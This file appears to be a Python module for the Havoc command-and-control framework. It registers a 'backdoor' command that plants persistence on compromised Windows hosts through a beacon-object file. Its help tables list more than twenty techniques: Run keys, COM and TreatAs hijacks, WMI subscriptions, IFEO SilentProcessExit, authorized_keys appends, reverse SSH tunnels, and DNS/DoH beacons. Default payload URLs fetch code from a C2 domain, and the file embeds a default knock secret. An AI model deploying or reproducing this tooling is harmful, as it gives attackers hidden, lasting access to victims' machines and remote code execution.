"""Maelstrom backdoor BOF — APT recovery.

  help backdoor
  help backdoor apply
  backdoor help | list                 local, never InlineExecute
  backdoor paths | priv | status       BOF
  backdoor check <id>                  BOF
  backdoor apply <id> [a] [b]          BOF — ONE id, ONE Demon (Coffee)
  backdoor clean <id>|all              BOF — remove persist (sshd/WinRM stay)

Inbound 10.66.0.0/24 only. Never WAN 22/5985. Keys = file.
HMAC / signed URLs live in dropped Intel\\PowerManager files, not schtask /tr.
"""
from havoc import Demon, RegisterCommand

try:
    from havoc import RegisterModule
except ImportError:
    def RegisterModule(*_a, **_k):
        return None

import os
import json

METHODS = {
    "wake", "ssh", "sshkey", "winrm", "wmi", "proxy", "bits", "com", "dns",
    "doh", "logon", "time", "knock", "spa", "magic", "treatas", "startup",
    "profile", "active", "autorun", "mshta", "sshd", "ifeo",
}

WAKE_FAMILY = {
    "wake", "bits", "com", "treatas", "logon", "wmi", "startup", "profile",
    "active", "autorun", "ifeo",
}

BD_HELP = """backdoor — recovery. Overlay / outbound first. ONE Coffee BOF per Demon.

  help backdoor
  help backdoor apply
  backdoor help [cmd]
  help | list              local
  paths | priv | status    BOF
  check <id>               BOF
  apply <id> [a] [b]       BOF  (explicit — never 10 at once)
  clean <id>|all           BOF  sshd/WinRM stay; sshkey needs needle

apply
  wake [url]               payload in HKCU, hidden powershell (no cmd window)
  ssh [user@host] [Rspec]  ssh.exe -R persist  default root@10.66.0.1  2201:127.0.0.1:3389
  sshkey [pubkey]          USERPROFILE\\.ssh\\authorized_keys APPEND
  knock listen|send [sec]  SPA HMAC-SHA256 UDP 62201, fw 10.66.0.0/24 (not WoL)
  dns [fqdn]               TXT parse + curl 30m
  doh [fqdn]               T1572 Cloudflare DoH TXT 30m
  bits [url]               T1197 + SetNotifyCmdLine
  com [url]                COM-Hunter LocalServer32 MsCtfMonitor+CacheTask
  treatas [url]            COM-Hunter TreatAs -> our CLSID
  logon [url]              T1037 UserInitMprLogonScript
  startup [url]            PersistBOF Startup\\IpmaUpdate.vbs (silent)
  profile [url]            T1546.013 PowerShell profile
  active [url]             T1547.014 Active Setup
  autorun [url]            cmd AutoRun
  mshta [url]              T1218.005 signed CDN .hta
  winrm                    5985 + firewall wg0 only
  proxy [10.66.x] [port]   PortProxy registry (no netsh) -> 127.0.0.1:22
  wmi [url]                T1546.003 explorer.exe start = wake file
  time [dll]               Time Provider if DLL already on disk
  sshd                     OpenSSH + fw overlay (keeps LAN SSH)
  ifeo [url]               T1546.012 SilentProcessExit WerFault
"""

BD_LIST = """id       priv     apply                                src
-------- -------- ------------------------------------ ----------------

wake     Medium   curl file + Run + ONLOGON            T1053+T1547
ssh      Medium   ssh.exe -R persist                   T1021.004
sshkey   Medium   authorized_keys APPEND               T1098.004
knock    Medium   SPA HMAC UDP :62201 persist          fwknop-class

dns      Medium   TXT parse + curl 30m                 T1071.004
doh      Medium   DoH Cloudflare TXT                   T1572
bits     Medium   T1197 + NotifyCmdLine                T1197
mshta    Medium   signed CDN .hta                      T1218.005

com      Medium   MsCtfMonitor+CacheTask LocalServer32 COM-Hunter
treatas  Medium   TreatAs -> our CLSID                 COM-Hunter
logon    Medium   T1037 logon script                   T1037.001
startup  Medium   Startup\\IpmaUpdate.vbs (silent)     PersistBOF
profile  Medium   PowerShell profile                   T1546.013
active   Medium   Active Setup                         T1547.014
autorun  Medium   cmd AutoRun                          T1546.001

winrm    High     5985 fw 10.66.0.0/24                 T1021.006
proxy    Admin    PortProxy 127.0.0.1:2200 -> :22      addportproxy-bof
wmi      Admin    explorer.exe start = wake            WMIPersistKit
sshd     High     OpenSSH + fw overlay                 T1133
ifeo     High     SilentProcessExit WerFault           T1546.012
time     SYSTEM   Time Provider existing DLL           PersistBOF

clean <id>|all    remove persist. sshd/WinRM stay.
"""

BD_TOPICS = {
    "help": "help backdoor\nhelp backdoor apply\nhelp backdoor clean\nbackdoor help [apply|clean|list]",
    "clean": (
        "backdoor clean <id>|all\n"
        "  ONE Coffee BOF. Removes files/Run/tasks/fw/COM/WMI we planted.\n"
        "  sshd + WinRM services stay (fw overlay rule only).\n"
        "  sshkey: backdoor clean sshkey <needle>  — never wipe whole authorized_keys\n"
        "  ex: backdoor clean wake\n"
        "      backdoor clean all"
    ),
    "list": BD_LIST,
    "paths": "backdoor paths\n  Hunt LOLBins + .ssh (BOF). One Coffee on this Demon.",
    "priv": "backdoor priv\n  Token IL + privileges (BOF).",
    "status": "backdoor status\n  Services + persist paths (BOF).",
    "check": (
        "backdoor check <id>\n"
        "  Can this id run on this Demon? (BOF)\n"
        "  ex: backdoor check ssh"
    ),
    "apply": (
        "backdoor apply <id> [a] [b]\n"
        "  ONE id, ONE Demon. Overlay/outbound first.\n"
        "  inbound 10.66.0.0/24. never WAN 22/5985. keys = file.\n"
        "  HMAC/signed URLs in %LOCALAPPDATA%\\Intel\\PowerManager\\ — not schtask /tr.\n"
        "  ids: wake ssh sshkey knock dns doh bits com treatas logon startup\n"
        "       profile active autorun mshta winrm proxy wmi time sshd ifeo\n"
        "  ex: backdoor apply wake\n"
        "      backdoor apply knock listen"
    ),
    "wake": "backdoor apply wake [url]\n  payload in HKCU Software\\Intel\\PowerManager\\Data + hidden powershell launcher.",
    "ssh": "backdoor apply ssh [user@host] [Rspec]\n  ssh.exe -R persist. default root@10.66.0.1  2201:127.0.0.1:3389",
    "sshkey": "backdoor apply sshkey [pubkey]\n  APPEND USERPROFILE\\.ssh\\authorized_keys. Administrators also need ProgramData.",
    "knock": "backdoor apply knock listen|send [secret]\n  SPA HMAC-SHA256 UDP 62201, fw 10.66.0.0/24. not WoL.",
    "spa": "alias of knock",
    "magic": "alias of knock",
}


def _kit_dir():
    env = os.environ.get("BACKDOOR_BOF") or os.environ.get("RIPTIDE_BOF")
    cands = []
    if env:
        cands.append(env)
    try:
        cands.append(os.path.dirname(os.path.abspath(__file__)))
    except (NameError, TypeError):
        pass
    cands.append(os.path.expanduser("~/github/maelstrom-mesh/bof"))
    cands.append(os.path.expanduser("~/github/maelstrom/modules/backdoor"))
    for d in cands:
        if d and os.path.isfile(os.path.join(d, "backdoor.x64.o")):
            return d
    return os.path.expanduser("~/github/maelstrom-mesh/bof")


def _obj_local():
    return os.path.join(_kit_dir(), "backdoor.x64.o")


def _obj_exec():
    local = _obj_local()
    if os.environ.get("MAELSTROM_MOP_URL") and os.path.isfile(local):
        return "/opt/maelstrom/modules/backdoor/backdoor.x64.o"
    return local


def _url_file(*names):
    base = os.path.expanduser("~/Desktop/htb/vps-maelstrom/loot")
    for n in names:
        p = os.path.join(base, n)
        if os.path.isfile(p):
            return open(p).read().strip().split()[0]
    return ""


def _wake_url():
    env = os.environ.get("BACKDOOR_WAKE_URL")
    if env:
        return env.strip()
    u = _url_file("drops/p1-signed-url.txt")
    if u:
        return u
    return "https://maelstrom-c2.duckdns.org/cdn/img/p1-reg.jpg"


def _hta_url():
    env = os.environ.get("BACKDOOR_HTA_URL")
    if env:
        return env.strip()
    u = _url_file("drops/p3-signed-url.txt")
    if u:
        return u
    jpath = os.path.expanduser("~/Desktop/htb/vps-maelstrom/loot/gen/p3.json")
    if os.path.isfile(jpath):
        try:
            j = json.load(open(jpath))
            return (j.get("drop_url") or j.get("url") or "").strip()
        except Exception:
            pass
    return "https://maelstrom-c2.duckdns.org/cdn/js/p3.hta"


def _ania_pub():
    env = os.environ.get("BACKDOOR_SSH_PUB")
    if env:
        return env.strip()
    p = os.path.expanduser("~/.ssh/id_ed25519_ania.pub")
    if os.path.isfile(p):
        return open(p).read().strip()
    return ""


def _spa_secret():
    return (os.environ.get("BACKDOOR_SPA_SECRET") or "maelstrom").strip()


def _note(demon, msg):
    demon.ConsoleWrite(demon.CONSOLE_INFO, msg)


def _info_lines(demonID, text):
    demon = Demon(demonID)
    for line in str(text).splitlines():
        demon.ConsoleWrite(demon.CONSOLE_INFO, line if line else " ")
    return True


def _fire5(demonID, c0, c1, c2, c3, c4, label):
    demon = Demon(demonID)
    local = _obj_local()
    if not os.path.isfile(local):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing %s — make -C bof" % local)
        return False
    obj = _obj_exec()
    _note(demon, "[backdoor] %s %s %s" % (c0, c1 or "-", c2 or "-"))
    packer = Packer()
    packer.addstr(c0 or "")
    packer.addstr(c1 or "")
    packer.addstr(c2 or "")
    packer.addstr(c3 or "")
    packer.addstr(c4 or "")
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, label)
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def backdoor_root(demonID, *param):
    if not param:
        return backdoor_help(demonID)
    sub = str(param[0]).lower()
    rest = param[1:]
    if sub in ("help", "-h", "--help"):
        return backdoor_help(demonID, *rest)
    if sub in ("list", "ls"):
        return backdoor_list(demonID)
    if sub in ("paths", "path", "hunt"):
        return backdoor_paths(demonID)
    if sub in ("priv", "whoami", "token"):
        return backdoor_priv(demonID)
    if sub in ("status", "info"):
        return backdoor_status(demonID)
    if sub == "check":
        return backdoor_check(demonID, *rest)
    if sub == "apply":
        return backdoor_apply(demonID, *rest)
    if sub in ("clean", "clear", "rm"):
        return backdoor_clean(demonID, *rest)
    if sub in METHODS:
        return _fire5(demonID, "check", sub, "", "", "", "backdoor check %s" % sub)
    return backdoor_help(demonID)


def backdoor_help(demonID, *param):
    key = ""
    if param:
        key = str(param[0]).lower().lstrip("-")
        if key in ("h", "help"):
            key = ""
    text = BD_TOPICS.get(key) or BD_HELP
    return _info_lines(demonID, text)


def backdoor_list(demonID, *param):
    return _info_lines(demonID, BD_LIST)


def backdoor_paths(demonID, *param):
    return _fire5(demonID, "paths", "", "", "", "", "backdoor paths")


def backdoor_priv(demonID, *param):
    return _fire5(demonID, "priv", "", "", "", "", "backdoor priv")


def backdoor_status(demonID, *param):
    return _fire5(demonID, "status", "", "", "", "", "backdoor status")


def backdoor_check(demonID, *param):
    mid = param[0] if param else ""
    if not mid:
        return backdoor_list(demonID)
    return _fire5(demonID, "check", str(mid), "", "", "", "backdoor check %s" % mid)


def backdoor_apply(demonID, *param):
    if not param:
        return backdoor_help(demonID)
    mid = str(param[0]).lower()
    a = str(param[1]) if len(param) > 1 else ""
    b = str(param[2]) if len(param) > 2 else ""
    extra = ""
    if mid in ("spa", "magic"):
        mid = "knock"
    url = _wake_url()
    if mid in WAKE_FAMILY and not a:
        a = url
    if mid == "mshta" and not a:
        a = _hta_url()
    if mid == "sshkey" and not a:
        a = _ania_pub()
        if not a:
            Demon(demonID).ConsoleWrite(Demon(demonID).CONSOLE_ERROR, "no pubkey — ~/.ssh/id_ed25519_ania.pub")
            return False
    if mid == "knock":
        if not a:
            a = "listen"
        if not b:
            b = _spa_secret()
        extra = url
    label = "backdoor apply %s" % mid
    return _fire5(demonID, "apply", mid, a, b, extra, label)


def backdoor_clean(demonID, *param):
    if not param:
        return backdoor_help(demonID, "clean")
    mid = str(param[0]).lower()
    extra = str(param[1]) if len(param) > 1 else ""
    if mid in ("spa", "magic"):
        mid = "knock"
    if mid == "sshkey" and not extra:
        extra = _ania_pub()
    return _fire5(demonID, "clean", mid, extra, "", "", "backdoor clean %s" % mid)


RegisterModule(
    "backdoor",
    "APT recovery. Overlay/outbound. ONE Coffee BOF per Demon",
    "API Only",
    "help|list|paths|priv|status|check|apply <id>|clean <id>|clean all  |  help backdoor",
    "help",
    "",
)

RegisterCommand(backdoor_root, "", "backdoor", "Recovery. Sub: help|list|paths|priv|status|check|apply|clean", 0, "help | list | paths | priv | status | check <id> | apply <id> [a] [b] | clean <id>|all", "help")
RegisterCommand(backdoor_help, "backdoor", "help", "Local usage. Never InlineExecute. help backdoor", 0, "[apply|clean|wake|ssh|sshkey|knock]", "apply")
RegisterCommand(backdoor_list, "backdoor", "list", "Local method table. Never InlineExecute", 0, "", "")
RegisterCommand(backdoor_paths, "backdoor", "paths", "Hunt LOLBins + .ssh (BOF)", 0, "", "")
RegisterCommand(backdoor_priv, "backdoor", "priv", "Token IL + privs (BOF)", 0, "", "")
RegisterCommand(backdoor_status, "backdoor", "status", "Services + paths (BOF)", 0, "", "")
RegisterCommand(backdoor_check, "backdoor", "check", "Can this id run? (BOF)", 0, "<id>", "ssh")
RegisterCommand(backdoor_apply, "backdoor", "apply", "ONE id. wake/ssh/sshkey/knock/dns/doh/bits/com/treatas/logon/startup/profile/active/autorun/mshta/winrm/proxy/wmi/time/sshd/ifeo", 0, "<id> [a] [b]", "wake")
RegisterCommand(backdoor_clean, "backdoor", "clean", "Remove persist. clean <id>|all. sshd/WinRM stay. sshkey needs needle", 0, "<id>|all", "wake")

try:
    open("/tmp/backdoor-gui-loaded", "w").write("backdoor.py loaded kit=%s\n" % _kit_dir())
except Exception:
    pass
